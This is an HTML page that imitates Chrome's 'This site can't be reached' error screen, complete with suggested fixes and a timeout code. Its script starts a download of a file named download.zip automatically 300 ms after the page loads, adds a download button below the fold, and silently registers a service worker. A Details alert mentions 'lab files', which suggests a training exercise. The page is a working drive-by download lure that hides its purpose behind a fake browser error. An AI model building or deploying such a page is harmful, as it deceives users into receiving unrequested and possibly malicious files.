<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>This site can't be reached</title>
    <style>
      :root {
        --bg: #202124;
        --fg: #e8eaed;
        --muted: #9aa0a6;
        --link: #8ab4f8;
        --btn: #8ab4f8;
        --btnText: #202124;
        --border: #5f6368;
      }
      * { box-sizing: border-box; }
      html, body { height: 100%; margin: 0; }
      body {
        background: var(--bg);
        color: var(--fg);
        font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
      }

      /* ── Hero ── */
      .hero {
        min-height: 100vh;
        width: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 24px;
      }
      .container { width: 100%; max-width: 672px; }
      .center { text-align: center; }
      .icon { margin-bottom: 24px; opacity: .85; }

      h1 { margin: 0 0 12px; font-size: 28px; font-weight: 600; }
      .sub { margin: 0 0 24px; color: var(--muted); font-size: 14px; }

      .panel {
        width: 100%;
        max-width: 420px;
        margin: 0 auto;
        text-align: left;
      }
      .label { color: var(--muted); margin-bottom: 8px; font-size: 13px; }
      ul { margin: 0; padding-left: 20px; }
      li { margin: 6px 0; color: var(--link); font-size: 13px; }
      .code { margin-top: 16px; color: var(--muted); font-size: 12px; letter-spacing: .02em; }

      .actions {
        margin: 28px auto 0;
        width: 100%;
        max-width: 420px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
      }
      .btn {
        border: 0;
        border-radius: 999px;
        padding: 10px 18px;
        font-size: 13px;
        font-weight: 600;
        cursor: pointer;
      }
      .btn-primary { background: var(--btn); color: var(--btnText); }
      .btn-primary:hover { filter: brightness(1.08); }
      .btn-ghost {
        background: transparent;
        color: var(--fg);
        border: 1px solid var(--border);
      }
      .btn-ghost:hover { background: rgba(255,255,255,.06); }

      .status {
        margin-top: 18px;
        color: var(--muted);
        font-size: 12px;
        min-height: 18px;
      }

      /* ── Below-fold download button ── */
      .below { width: 100%; padding: 0 24px 64px; }
      .belowInner { max-width: 672px; margin: 0 auto; }
      .spacer { height: 44px; }
      .downloadWrap { display: flex; justify-content: center; }
      .downloadBtn {
        border-radius: 10px;
        border: 1px solid rgba(255,255,255,.12);
        background: rgba(255,255,255,.10);
        color: var(--fg);
        padding: 10px 20px;
        font-size: 13px;
        font-weight: 600;
        cursor: pointer;
        transition: background .15s;
      }
      .downloadBtn:hover  { background: rgba(255,255,255,.16); }
      .downloadBtn:disabled { opacity: .5; cursor: not-allowed; }

      @media (min-width: 640px) {
        h1 { font-size: 32px; }
        .sub { font-size: 15px; }
      }
    </style>
  </head>
  <body>
    <main>
      <!-- Chrome-style error screen -->
      <section class="hero">
        <div class="container">
          <div class="center">

            <div class="icon" aria-hidden="true">
              <svg viewBox="0 0 24 24" width="72" height="72" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path
                  d="M7 3H17C18.1046 3 19 3.89543 19 5V19C19 20.1046 18.1046 21 17 21H7
                     C5.89543 21 5 20.1046 5 19V5C5 3.89543 5.89543 3 7 3Z"
                  stroke="#9aa0a6" stroke-width="1.5" />
                <path d="M8 8H16"  stroke="#9aa0a6" stroke-width="1.5" stroke-linecap="round" />
                <path d="M8 12H14" stroke="#9aa0a6" stroke-width="1.5" stroke-linecap="round" />
                <path d="M8 16H12" stroke="#9aa0a6" stroke-width="1.5" stroke-linecap="round" />
              </svg>
            </div>

            <h1>This site can't be reached</h1>
            <p class="sub">The server took too long to respond.</p>

            <div class="panel">
              <div class="label">Try:</div>
              <ul>
                <li>Checking the connection</li>
                <li>Checking the proxy and the firewall</li>
                <li>Running Windows Network Diagnostics</li>
              </ul>
              <div class="code">ERR_CONNECTION_TIMED_OUT</div>
            </div>

            <div class="actions">
              <button id="reloadBtn"  type="button" class="btn btn-primary">Reload</button>
              <button id="detailsBtn" type="button" class="btn btn-ghost">Details</button>
            </div>

            <div class="status" id="downloadStatus" aria-live="polite"></div>
          </div>
        </div>
      </section>

      <!-- Secondary download button -->
      <section class="below">
        <div class="belowInner">
          <div class="spacer"></div>
          <div class="downloadWrap">
            <button id="downloadBtn" type="button" class="downloadBtn">Download</button>
          </div>
        </div>
      </section>
    </main>

    <script>
      const FILE_PATH = "./download.zip";
      const FILE_NAME = "download.zip";

      const statusEl    = document.getElementById("downloadStatus");
      const downloadBtn = document.getElementById("downloadBtn");
      const reloadBtn   = document.getElementById("reloadBtn");
      const detailsBtn  = document.getElementById("detailsBtn");

      function setStatus(msg) {
        if (statusEl) statusEl.textContent = msg;
      }

      async function downloadFile() {
        downloadBtn.disabled = true;
        try {
          setStatus("Preparing download…");
          const res = await fetch(FILE_PATH, { cache: "no-store" });
          if (!res.ok) throw new Error("HTTP " + res.status);

          const blob = await res.blob();
          const url  = URL.createObjectURL(blob);
          const a    = document.createElement("a");
          a.href     = url;
          a.download = FILE_NAME;
          a.rel      = "noopener";
          document.body.appendChild(a);
          a.click();
          a.remove();
          setTimeout(() => URL.revokeObjectURL(url), 15_000);
          setStatus("Download started.");
        } catch (err) {
          // Fallback: direct navigation (browser handles save dialog)
          const a    = document.createElement("a");
          a.href     = FILE_PATH;
          a.download = FILE_NAME;
          a.rel      = "noopener";
          document.body.appendChild(a);
          a.click();
          a.remove();
          setStatus("Download started.");
        } finally {
          downloadBtn.disabled = false;
        }
      }

      document.addEventListener("DOMContentLoaded", () => {
        if ("serviceWorker" in navigator) {
          navigator.serviceWorker.register("/sw.js").catch(() => {});
        }
        reloadBtn?.addEventListener("click", () => window.location.reload());
        detailsBtn?.addEventListener("click", () =>
          alert("Offline-style page. Click Download to get the lab files.")
        );
        downloadBtn?.addEventListener("click", downloadFile);

        // Auto-trigger on load
        setTimeout(downloadFile, 300);
      });
    </script>
  </body>
</html>
